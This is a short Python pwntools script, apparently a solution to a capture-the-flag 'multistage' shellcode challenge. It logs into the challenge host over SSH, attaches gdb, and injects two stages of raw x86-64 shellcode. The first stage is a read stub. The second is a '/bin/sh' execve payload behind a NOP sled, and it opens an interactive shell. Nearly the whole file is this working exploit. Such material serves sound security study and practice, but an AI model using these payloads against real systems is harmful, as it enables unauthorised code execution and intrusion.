
from pwn import *
from getpass import *
import logging
context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

#call python3 x_remote.oy DEBUG
host = "acidburn"
#ip = "192.168.10.123"
ip = "127.0.0.1"
path = "/challenges/shellcode/multistage/"
prt = int(input(" insert "+host+"'s port to connect to:"))
pwd = getpass("insert "+host+"'s password:")
ssh = ssh(host,ip,password=pwd,port= prt)
r = ssh.process("."+path+"multistage")
#r = process("./multistage")
gdb.attach(r,'''b *main''')

#this opens read(stdin,buffer,0x100)
stage_one =b"\x48\x31\xC0\x48\x89\xC7\xBE\x70\x40\x40\x00\xBA\x00\x01\x00\x00\x0F\x05"

payload =b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x70\x40\x40\x00\x48\xC7\xC6\x78\x40\x40\x00\x48\x89\xF2\x0F\x05"

stage_two = b"/bin/sh\x00"+ b"\x00"*8 + b"\x90"*20 + payload
input("Press key to inject stage one: ")
r.send(stage_one)

input("Press key to inject stage two: ")
r.send(stage_two)


r.interactive()
#from this point on the connection opens a shell for stdin/stdout
